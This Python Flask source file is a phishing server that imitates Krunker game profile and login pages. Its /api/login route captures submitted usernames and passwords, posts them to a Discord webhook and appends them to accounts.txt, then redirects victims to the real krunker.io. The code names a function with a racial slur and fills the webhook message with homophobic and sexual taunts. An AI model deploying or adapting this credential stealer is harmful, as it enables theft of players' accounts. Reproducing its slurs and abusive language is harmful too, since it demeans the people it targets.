import flask
from discord_webhook import DiscordWebhook, DiscordEmbed

app = flask.Flask(__name__)

@app.route('/social.html', methods=['GET', 'POST'])
def index():
    username = flask.request.args.get('q')
    instant_login = flask.request.args.get('verify')
    if instant_login == None:
        instant_login = True
    if username == None:
        return flask.render_template('main.html', username="STORM_Hype", instant_login=instant_login)
    elif len(username) == 0:
        return flask.render_template('main.html', username="STORM_Hype", instant_login=instant_login)
    else:
        return flask.render_template('main.html', username=username, instant_login=instant_login)

@app.route('/social.htnl', methods=['GET', 'POST'])
def index2():
    username = flask.request.args.get('q')
    level = flask.request.args.get('l')
    kr = flask.request.args.get('k')
    kd = flask.request.args.get('kd')
    instant_login = flask.request.args.get('verify')
    if instant_login == None:
        instant_login = False
    if username == None:
        return flask.render_template('main.html', username="STORM_Hype", level="109", kd="3.002", kr="104,000", instant_login=instant_login)
    elif len(username) == 0:
        return flask.render_template('main.html', username="STORM_Hype", level="109", kd="3.002", kr="104,000", instant_login=instant_login)
    else:
        return flask.render_template('main.html', username=username, level=level, kd=kd, kr=kr, instant_login=instant_login)

@app.route('/api/login', methods=['POST', 'GET'])
def login():
    if flask.request.method.lower() == "post":
        send_it_nigger(flask.request.form.get('accName'), flask.request.form.get('accPass'))
    elif flask.request.method.lower() == "get":
        send_it_nigger(flask.request.args.get('accName'), flask.request.args.get('accPass'))
    else:
        return flask.redirect('https://krunker.io/social.html?p=profile&q=')
    return flask.redirect('https://krunker.io/social.html?p=profile&q=')

@app.errorhandler(404)
def page_not_found(e):
    return flask.redirect(flask.url_for('index'))

def send_it_nigger(username:str, password:str):
    try:
        webhook = DiscordWebhook(url='YOUR DISCORD WEBHOOK', username="your auntie")
        embed = DiscordEmbed(title='Gay Kid Caught Lacking', description='Send me nudes baby', color='03b2f8')
        embed.set_author(name='Milk man', url='https://www.youtube.com/watch?v=1MX7PyO5ZFI', icon_url='https://cdn.discordapp.com/attachments/986722705002868810/986729927183327322/38C6B092-09EC-4240-B9DC-BAD5BB6FF4FF.jpg')
        embed.set_footer(text='What Am I doing?')
        embed.set_timestamp()
        embed.add_embed_field(name='Username', value='{}'.format(username))
        embed.add_embed_field(name='Password', value='{}'.format(password))
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass
    with open('accounts.txt', 'a+') as f:
        f.write('Username: {} | Password: {}\n'.format(username, password))

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=80)